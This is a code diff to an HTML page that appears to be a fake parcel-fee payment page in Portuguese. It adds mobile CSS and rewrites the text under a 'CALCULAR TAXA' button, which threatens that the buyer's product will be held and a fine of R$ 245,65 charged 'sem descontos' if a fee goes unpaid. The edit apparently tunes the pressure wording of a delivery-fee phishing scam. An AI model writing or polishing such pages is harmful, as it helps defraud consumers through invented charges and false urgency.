@@ -236,6 +236,39 @@
       color: #067D62;
     }
 
+    @media (max-width: 600px) {
+      .main-container {
+        margin: 10px auto;
+        padding: 0 10px;
+      }
+
+      .content-section {
+        padding: 16px 14px;
+      }
+
+      .loading-bar {
+        width: 250px;
+      }
+
+      .navbar-content {
+        padding: 8px 10px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .alert-header {
+        padding: 12px 14px;
+      }
+
+      .content-section {
+        padding: 14px 12px;
+      }
+
+      .message-box {
+        padding: 12px;
+      }
+    }
+
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
@@ -276,9 +309,9 @@
         <button id="action-button" class="action-button">CALCULAR TAXA</button>
 
         <div class="info-section">
-          <p class="info-text">Clique para continuar</p>
-          <p class="info-text" style="color: var(--error-color); font-weight: 700; margin-top: 10px;">
-            Caso essa taxa não seja paga nos próximos 30 minutos, seu produto ficará retido e será cobrada uma multa no valor total de R$ 178,45, sem descontos.
+          <p class="info-text">
+            Caso a taxa não seja paga, seu produto ficará retido e será cobrada uma multa no valor total de 
+            <span style="color: #B12704; font-weight: 700;">R$ 245,65</span>, sem descontos.
           </p>
         </div>
 
